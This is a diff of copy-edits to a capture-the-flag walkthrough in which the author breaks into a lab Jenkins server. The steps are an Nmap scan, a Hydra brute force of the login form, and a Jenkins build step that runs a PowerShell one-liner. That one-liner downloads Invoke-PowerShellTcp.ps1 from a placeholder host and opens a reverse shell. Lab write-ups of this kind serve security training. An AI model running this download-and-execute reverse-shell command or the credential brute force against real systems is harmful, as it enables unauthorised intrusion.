@@ -75,7 +75,7 @@ Nmap done: 1 IP address (1 host up) scanned in 558.59 seconds
 ```
 Ok, so based on these results we now know how many ports are open.
 
-> Question #2: What is the username and password for the log in panel(in the format username:password)?
+> Question #2: What is the username and password for the login panel(in the format username:password)?
 
 Ok let's start by seeing what is being served in the port **80** of this machine.
 
@@ -156,7 +156,7 @@ As we can see in the intercepted request we get the rest of the pieces we were l
 - **[PasswordField]**: j_password
 - **[InvalidCredentialsErrorMessage]**: Invalid username or password
 
-We'll also need to know the **[PORT]** where the login forms lives, but we know that already from our namp scan(8080).
+We'll also need to know the **[PORT]** where the login forms lives, but we know that already from our Nmap scan(8080).
 
 So now let's try to configure **Hydra** so we can trigger that brute force attack.
 
@@ -210,7 +210,7 @@ So that gives us the answer to Question #2 in a brute-forced way.
 
 Let's move to the next objective.
 
-> Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: **_powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_**
+> Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: **_powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-IP -Port your-port_**
 
 Well this objective kind of gives us quite a hit at what to do next. I figure we need to find a way to execute that on our newly accessed server. Let's take a look at what can we do in our Jenkins admin panel.
 
@@ -271,7 +271,7 @@ That's done, now to paste our full command into the Jenkins Job Build command se
 
 
 ![We enter our exploit command](https://i.imgur.com/aWPWDUy.png)
-After we enter the command, we click on **Save** button to save the changes.
+After we enter the command, we click on the **Save** button to save the changes.
 
 Then we go back to the main project details page.
 Let's trigger a new build by clicking on **Build Now** button so we see if your command runs fine.
@@ -318,7 +318,7 @@ PS C:\Users\bruce\Desktop> type user.txt
 {and-we-finally-get-the-flag-value}
 
 ```
-Well, we made it this far. We were able to exploit a Jenkins project/job and we managed to get a reverse shell successfully. With this we can mark Question #3 as completed and we can  also answer the question number 4.
+Well, we made it this far. We were able to exploit a Jenkins project/job and we managed to get a reverse shell successfully. With this we can mark Question #3 as completed and we can  also answer question number 4.
 
 > As it turns out we didn't need any **GoBuster** scans. They returned nothing useful anyways. However, we still we managed to get the initial access and it never hurts to do some extra enumeration.
 
